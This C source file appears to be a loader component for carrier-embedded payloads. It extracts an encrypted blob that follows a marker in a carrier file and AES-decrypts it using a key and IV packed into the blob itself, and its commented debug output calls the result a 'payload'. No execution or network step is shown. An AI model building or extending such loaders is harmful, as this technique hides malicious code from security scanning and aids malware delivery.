#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include "aes.h"

/// Print Hex 
void PrintHexBuffer(const unsigned char* buffer, size_t size) {
    if (!buffer || size == 0) {
        //printf("[!] Empty buffer\n");
        return;
    }

    for (size_t i = 0; i < size; i++) {
        // Print each byte as two hex characters
        printf("0x%02X ", buffer[i]);

        // Optional: newline every 16 bytes for readability
        if ((i + 1) % 16 == 0)
            printf("\n\t\t");
    }
    printf("\n");
}

/// Step 1: Read entire file into memory
unsigned char* ReadFileToBuffer(const char* filename, size_t* out_size) {
    FILE* f = fopen(filename, "rb");
    if (!f) {
        perror("File open");
        return NULL;
    }
    fseek(f, 0, SEEK_END);
    long fsize = ftell(f);
    rewind(f);

    unsigned char* buf = malloc(fsize);
    if (!buf) {
        fprintf(stderr, "malloc failed\n");
        fclose(f);
        return NULL;
    }
    fread(buf, 1, fsize, f);
    fclose(f);

    *out_size = fsize;
    return buf;
}

/// Step 2: Extract blob from carrier (signature marker)
unsigned char* ExtractBlob(const char* carrier_file, size_t* out_size) {
    size_t fsize = 0;
    uint8_t* buf = ReadFileToBuffer(carrier_file, &fsize);
	if (!buf) {
		//fprintf(stderr, "Failed to read file: %s\nExit", carrier_file);
		return NULL;
    }

    // Signature = first 4 bytes
    uint8_t signature[4];
    memcpy(signature, buf, 4);

    // Find last occurrence
    uint8_t* last = NULL;
    for (long i = 0; i <= (long)fsize - 4; i++) {
        if (memcmp(buf + i, signature, 4) == 0) {
            last = buf + i;
        }
    }
    if (!last) {
        //fprintf(stderr, "Signature not found\n");
        free(buf);
        return NULL;
    }

    size_t offset = (last - buf) + 4;
    size_t blob_size = fsize - offset;

    uint8_t* blob = malloc(blob_size);
    if (!blob) {
        //fprintf(stderr, "malloc failed\n");
        free(buf);
        return NULL;
    }
    memcpy(blob, buf + offset, blob_size);
    free(buf);

    *out_size = blob_size;
    return blob;
}

/// Step 3: Decrypt blob [key][iv][ciphertext]
unsigned char* DecryptBlob(const unsigned char* blob, size_t blob_size, size_t* out_size) {
    if (blob_size <= 48) {
        fprintf(stderr, "Blob too small\n");
        return NULL;
    }

    const uint8_t* key = blob;
    const uint8_t* iv = blob + 32;
    const uint8_t* cipher = blob + 32 + 16;
    size_t clen = blob_size - 32 - 16;

    uint8_t* buf = malloc(clen);
    if (!buf) {
        fprintf(stderr, "malloc failed\n");
        return NULL;
    }
    memcpy(buf, cipher, clen);

    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, key, iv);
    AES_CBC_decrypt_buffer(&ctx, buf, clen);

    // Remove PKCS#7 padding
    uint8_t padval = buf[clen - 1];
    if (padval == 0 || padval > 16) {
        fprintf(stderr, "Invalid padding\n");
        free(buf);
        return NULL;
    }
    size_t plen = clen - padval;

    *out_size = plen;
    return buf;
}

/// Step 4: Loader convenience wrapper
unsigned char* Decrypt(const char* carrier_file, size_t* out_size) {
    //printf("[*] Carrier file: %s\n", carrier_file);
    // Check if file exist
	FILE* f = fopen(carrier_file, "rb");
	if (f == NULL) {
		//fprintf(stderr, "[!] File not found: %s\n", carrier_file);
		return NULL;
	}

    size_t blob_size = 0;
    unsigned char* blob = ExtractBlob(carrier_file, &blob_size);

    if (!blob) {
        //fprintf(stderr, "[!] Failed to extract blob from %s\n", carrier_file);
        return NULL;
    }
    //printf("[+] Extracted blob size: %zu bytes\n", blob_size);

    unsigned char* plaintext = DecryptBlob(blob, blob_size, out_size);
    free(blob);

    if (!plaintext) {
        //fprintf(stderr, "[!] Decryption failed for %s\n", carrier_file);
        return NULL;
    }
    //printf("[+] Decrypted payload size: %zu bytes\n", *out_size);

    return plaintext;
}

